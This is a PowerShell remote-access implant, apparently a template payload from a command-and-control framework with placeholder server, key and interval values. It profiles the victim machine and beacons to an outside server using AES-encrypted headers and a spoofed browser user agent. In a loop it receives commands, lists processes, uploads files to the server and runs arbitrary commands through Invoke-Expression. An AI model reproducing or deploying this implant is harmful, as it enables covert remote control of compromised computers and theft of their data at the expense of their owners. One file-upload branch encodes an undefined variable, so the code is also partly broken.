$interval = OCU_INTERVAL;
$key = "OCT_KEY";
function Create-AesManagedObject($key, $IV) {
    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
    $aesManaged.BlockSize = 128
    $aesManaged.KeySize = 256
    if ($IV) {
        if ($IV.getType().Name -eq "String") {
            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
        }
        else {
            $aesManaged.IV = $IV
        }
    }
    if ($key) {
        if ($key.getType().Name -eq "String") {
            $aesManaged.Key = [System.Convert]::FromBase64String($key)
        }
        else {
            $aesManaged.Key = $key
        }
    }
    $aesManaged
}

function EncryptCommand($key, $unencryptedString) {
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($unencryptedString)
    $aesManaged = Create-AesManagedObject $key
    $encryptor = $aesManaged.CreateEncryptor()
    $encryptedData = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
    [byte[]] $fullData = $aesManaged.IV + $encryptedData
    # $aesManaged.Dispose()
    [System.Convert]::ToBase64String($fullData)
}

function DecryptCommand($key, $encryptedStringWithIV) {
    $bytes = [System.Convert]::FromBase64String($encryptedStringWithIV)
    $IV = $bytes[0..15]
    $aesManaged = Create-AesManagedObject $key $IV
    $decryptor = $aesManaged.CreateDecryptor();
    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 16, $bytes.Length - 16);
    # $aesManaged.Dispose()
    [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
}

$progressPreference = 'silentlyContinue';
$wc = New-Object system.Net.WebClient;
$wc2 = New-Object system.Net.WebClient;
$wcr = New-Object system.Net.WebClient;
$hostname = hostname;
$he = EncryptCommand $key $hostname
$random = -join ((65..90) | Get-Random -Count 5 | % {[char]$_});
$final_hostname = "$hostname-$random";
$whoami = whoami;
$arch = (Get-WmiObject Win32_OperatingSystem).OSArchitecture
$os = (Get-WmiObject -class Win32_OperatingSystem).Caption + "($arch)";
$domain = (Get-WmiObject Win32_ComputerSystem).Domain;

# format the headers
$raw_header = "$final_hostname,$whoami,$os,$pid,$domain";

# encrypt the variables
$encrypted_header = EncryptCommand $key $raw_header;

# send the encrypted variables to the server
$wc.Headers.add("Authorization",$encrypted_header);
$wc.Headers.add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36")
$wc.downloadString("OCU_PROTO://SRVHOST/first_ping");

while($true){
    $command_raw = $wc2.downloadString("OCU_PROTO://SRVHOST/command/$final_hostname");
    $final_command = DecryptCommand $key $command_raw
    $fc = $final_command.Trim([char]0).Trim([char]1).Trim([char]2).Trim([char]3).Trim([char]4).Trim([char]5).Trim([char]6).Trim([char]7).Trim([char]8).Trim([char]9).Trim([char]10).Trim([char]11).Trim([char]12).Trim([char]13).Trim([char]14).Trim([char]15).Trim([char]16).Trim([char]17).Trim([char]18).Trim([char]19).Trim([char]20).Trim([char]21)

    if($fc -eq "False"){
      echo "DoNothig"
    }elseif($fc -eq "Report"){
      $ps = foreach ($i in Get-Process){$i.ProcessName};
      $ps+= (Get-WmiObject -Class win32_operatingSystem).version;
      $pst = EncryptCommand $key $ps
      $wcr.Headers.add("Authorization",$pst);
      $wcr.Headers.add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36")
      $wcr.Headers.add("App-Logic", $he)
      $wcr.downloadString("OCU_PROTO://SRVHOST/report");
    }
    elseif($fc.split(" ")[0] -eq "Download"){
      $filename = EncryptCommand $key $fc.split("\")[-1]

      echo "Download order to file $filename"
      $file_content = (Get-Content $fc.split(" ")[1] -Encoding byte)
      $file_base64 =[Convert]::ToBase64String($Bytes)
      $efc = EncryptCommand $key $file_base64
      echo $efc;
      $wc3 = new-object net.WebClient
      $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
      $wc3.UploadString("http://SRVHOST/file_receiver", "fn=$filename&token=$efc")
    }else{
      try{
        $ec = Invoke-Expression ($fc) | Out-String;
        }
        catch{
        $ec = $Error[0] | Out-String;
        }
        $EncodedText = EncryptCommand $key $ec;
        $wc3 = New-Object system.Net.WebClient;
        $wc3.Headers.add("Authorization",$EncodedText);
        $wc3.downloadString("OCU_PROTO://SRVHOST/command_receiver");

    }
    sleep $interval;
    }
